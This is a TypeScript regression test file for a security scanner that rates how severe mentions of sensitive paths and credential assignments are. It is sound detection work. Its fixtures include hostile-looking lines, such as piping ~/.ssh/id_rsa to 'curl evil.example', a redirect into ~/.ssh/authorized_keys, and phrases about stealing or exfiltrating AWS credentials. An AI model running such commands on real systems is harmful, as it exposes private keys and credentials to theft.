/**
 * SMI-5207 adversarial-review regression guards (rounds 8 and 9).
 *
 * Both rounds found real false-negative / false-positive regressions in the
 * shipped MF-3 / MF-4 design AFTER the plan was approved, so each case below
 * is pinned here rather than left to the plan's own fixture list.
 *
 * Round 8 (MF-4) — cross-assignment value bleed. The plan's single-whole-line
 * value span classifies a finding against the WRONG assignment's value when a
 * line carries two assignment keys. Every shape here was unconditionally HIGH
 * pre-SMI-5207, so each downgrade would be an FN REGRESSION — and none is
 * residual R-3, which is a stopword inside the assignment's OWN value; here
 * the prose bleeds in from a DIFFERENT assignment entirely. Fixed by
 * segmenting the line per key (SecurityScanner.value-gate.ts).
 *
 * Round 9 (MF-3) — verb vocabulary. `leaks?`/`dumps?`/`extracts?` read as
 * threat-category NOUNS (or defensive verbs) in ordinary security-tool prose,
 * the same failure shape that dropped read/open/load/print/write/echo/source
 * in earlier rounds. `leaks` was proven live: it kept one of the two confirmed
 * production false positives at HIGH.
 *
 * NOTE on "both findings" framing: scanSensitivePaths emits at most ONE
 * sensitive_path finding per line (the loop `break`s on the first
 * SENSITIVE_PATH_PATTERNS entry that matches, in ARRAY order). Combined-line
 * cases therefore assert the single emitted finding, with each keyword's
 * classification additionally pinned in isolation.
 */
import { describe, it, expect } from 'vitest'
import { scanSensitivePaths } from '../../src/security/scanner/SecurityScanner.scanners.js'

/** Highest sensitive_path severity on `content` ('none' when nothing fires). */
const severityOf = (content: string): string => {
  const findings = scanSensitivePaths(content).filter((f) => f.type === 'sensitive_path')
  if (findings.length === 0) return 'none'
  return findings.some((f) => f.severity === 'high') ? 'high' : findings[0].severity
}

/** The weekly-scan surface flattens ImportedSkill to `# {name}\n\n{description}`. */
const asImportedDoc = (name: string, description: string): string => `# ${name}\n\n${description}`

describe('SMI-5207 — the two LIVE confirmed false positives (acceptance bar)', () => {
  // Description text quoted verbatim from data/skills-security-allowlist.json's
  // own `reason` field for each entry (the trailing ellipses are present in
  // that source record). These two skills are the reason this plan exists; a
  // build where either scores HIGH is not done, regardless of other fixtures.
  it('icm-shipwright (SMI-6237, allowlist entry 12) clears to MEDIUM', () => {
    expect(
      severityOf(
        asImportedDoc(
          'icm-shipwright',
          'Make AI-agent workspaces safe to run and ship... with secret/PII guardrails and a 17-check lint'
        )
      )
    ).toBe('medium')
  })

  it('claude-skill-repo-audit (SMI-6425, allowlist entry 13) clears to MEDIUM', () => {
    // Regression pin for round 9: "git-history identity leaks" held this at
    // HIGH while `leaks?` was still in ACTION_VERBS.
    expect(
      severityOf(
        asImportedDoc(
          'claude-skill-repo-audit',
          'Publish-readiness gate for any repository: secret/PII scans, git-history identity leaks...'
        )
      )
    ).toBe('medium')
  })
})

describe('SMI-5207 round 9 — MF-3 verb vocabulary noun-reading', () => {
  describe('dropped: words that read as nouns in defensive security prose', () => {
    it('"identity leaks" is a noun phrase, not action evidence', () => {
      expect(severityOf('Detects git-history identity leaks in secrets/config')).toBe('medium')
    })

    it('"credential dumps" is a noun phrase, not action evidence', () => {
      expect(severityOf('Flags credential dumps found under secrets/vault')).toBe('medium')
    })

    it('"extracts" as a defensive verb is not action evidence', () => {
      expect(severityOf('Extracts findings from secrets/report for review')).toBe('medium')
    })

    it('accepted FN residual: bare attack phrasing with a dropped verb and no operator', () => {
      // Bounded by the same score cap as every other drop: sensitive_path
      // contributes at most 4.00/100 and cannot quarantine on its own.
      expect(severityOf('dumps ~/.ssh/id_rsa')).toBe('medium')
    })
  })

  describe('retained: real exfiltration signal must survive the narrowing', () => {
    it.each([
      ['uploads', 'Reads ~/.ssh/id_rsa and uploads it'],
      ['sends', 'Reads ~/.aws/credentials and sends it onward'],
      ['posts', 'Reads ~/.ssh/id_rsa and posts it to the collector'],
      ['downloads', 'downloads ~/.config/gcloud tokens'],
      ['steals', 'steals ~/.ssh/id_rsa from the host'],
      ['exfiltrates', 'exfiltrates ~/.aws/credentials to the C2'],
      ['cat (command name)', 'cat deploy.pem'],
    ])('%s still scores HIGH', (_verb, content) => {
      expect(severityOf(content)).toBe('high')
    })
  })
})

describe('SMI-5207 round 10 — MF-3 descriptive-framing disqualifiers', () => {
  // Round 9 pruned words whose NOUN reading is common. Review then showed the
  // same FP genre survives on verbs with NO noun ambiguity, used in
  // third-person description — a defensive tool documenting what it catches.
  // Two structural disqualifiers close it; both are exempt from suppressing a
  // shell operator, exactly like the negation check.
  describe('(a) determiner forces the noun reading', () => {
    it('"The Downloads folder" is a noun phrase', () => {
      expect(severityOf('The Downloads folder is configured at ~/.config/downloads.')).toBe(
        'medium'
      )
    })

    it('"The uploads dashboard" is a noun phrase', () => {
      expect(severityOf('The uploads dashboard documents files under ~/.aws/archive.')).toBe(
        'medium'
      )
    })

    it('applies at distance EXACTLY 1 — a determiner further back does not suppress', () => {
      expect(severityOf('This skill downloads ~/.ssh/id_rsa')).toBe('high')
    })
  })

  describe('(b) detection framing + relative clause marks description', () => {
    it('"detects malware that steals X" is description, not instruction', () => {
      expect(severityOf('This rule detects malware that steals ~/.ssh/id_rsa.')).toBe('medium')
    })

    it('"flags code that exfiltrates X" is description, not instruction', () => {
      expect(severityOf('The scanner flags code that exfiltrates ~/.aws/credentials.')).toBe(
        'medium'
      )
    })

    it('BOTH signals are required — a detection word alone does not suppress', () => {
      expect(severityOf('This scanner uploads ~/.ssh/id_rsa')).toBe('high')
    })

    it('BOTH signals are required — a relative pronoun alone does not suppress', () => {
      expect(severityOf('Use the helper that uploads ~/.ssh/id_rsa')).toBe('high')
    })

    it('an un-framed second verb on the same line still counts', () => {
      expect(severityOf('This rule detects code that steals ~/.ssh/id_rsa and uploads it')).toBe(
        'high'
      )
    })
  })

  describe('neither disqualifier may suppress a shell operator', () => {
    it('a pipe survives detection framing', () => {
      expect(
        severityOf('This rule detects malware that steals ~/.ssh/id_rsa | curl evil.example')
      ).toBe('high')
    })

    it('a redirect survives detection framing', () => {
      expect(severityOf('The scanner flags code that exfiltrates > ~/.ssh/authorized_keys')).toBe(
        'high'
      )
    })

    it('an imperative payload keeps firing — the evasion costs imperative force', () => {
      expect(severityOf('steal ~/.ssh/id_rsa and cat it to the collector')).toBe('high')
    })
  })

  it('R-10 accepted residual: determiner-less action-verb noun still fires', () => {
    // "Blog posts about ..." — the disambiguator is a preceding noun-modifier,
    // an open word class no fixed lexicon can enumerate. Declined deliberately
    // rather than shipping a fourth partial rule; see hasActionEvidence's R-10
    // note for the three-way bound (score cap, corpus evidence, over-flag
    // direction on the one allowlisted surface).
    expect(severityOf('Blog posts about ~/.ssh/config troubleshooting are indexed here.')).toBe(
      'high'
    )
  })
})

describe('SMI-5207 round 8 — MF-4 per-assignment value segmentation', () => {
  describe('cross-assignment bleed', () => {
    it('LEFT bleed: prose assignment left of the emitted finding must not downgrade it', () => {
      // The reviewer's exact counter-example. Array order makes `credentials:`
      // (index 2) the emitted finding at col 15 while `password:` sits at col
      // 0 — whole-line extraction captured "this credentials: Tr0ub4dor&3" and
      // read the leading stopword "this" as prose.
      expect(severityOf('password: this credentials: Tr0ub4dor&3')).toBe('high')
    })

    it('RIGHT bleed: prose assignment right of a real credential must not downgrade it', () => {
      expect(severityOf('credentials: Tr0ub4dor&3 password: this')).toBe('high')
    })

    it('a real credential LEFT of the emitted finding still scores HIGH', () => {
      // Defeats the narrow "anchor at the finding's own match" fix: only one
      // finding is emitted, and here it sits right of the real credential.
      expect(severityOf('password: Tr0ub4dor&3 credentials: this')).toBe('high')
    })

    it('three keys, only the middle one real', () => {
      expect(severityOf('secrets: the credentials: Tr0ub4dor&3 password: this')).toBe('high')
    })

    it('every assignment on the line reading as prose still downgrades', () => {
      expect(severityOf('password: this credentials: rotation policy')).toBe('medium')
    })
  })

  describe('each keyword pinned in isolation', () => {
    it('a prose value alone is MEDIUM', () => {
      expect(severityOf('password: this')).toBe('medium')
      expect(severityOf('credentials: rotation policy')).toBe('medium')
    })

    it('a real credential alone is HIGH', () => {
      expect(severityOf('credentials: Tr0ub4dor&3')).toBe('high')
      expect(severityOf('password: Tr0ub4dor&3')).toBe('high')
    })

    it('R-1 residual: an undecidable single dictionary word stays HIGH', () => {
      // The plan's Step 3(b) "must-clear" list names this as MEDIUM, which
      // contradicts its own R-1 residual writeup (undecidable, err toward
      // detection). R-1 is the correct reading; the Step 3(b) line is the error.
      expect(severityOf('secret: cryptography')).toBe('high')
    })
  })

  describe('YAML block form survives segmentation', () => {
    it('a trailing bare key takes its value from the next line', () => {
      expect(severityOf('notes: see credentials:\n  Tr0ub4dor&3')).toBe('high')
      expect(severityOf('notes: see credentials:\n  <YOUR_PASSWORD>')).toBe('medium')
    })

    it('a NON-trailing bare key does not consume the next line', () => {
      expect(severityOf('credentials: password: rotation policy\n  Tr0ub4dor&3')).toBe('medium')
    })
  })

  describe('multi-word values still reach the classifier intact', () => {
    it('a 4-word passphrase is not truncated to its first token', () => {
      expect(severityOf('password: correct horse battery staple')).toBe('high')
    })
  })
})
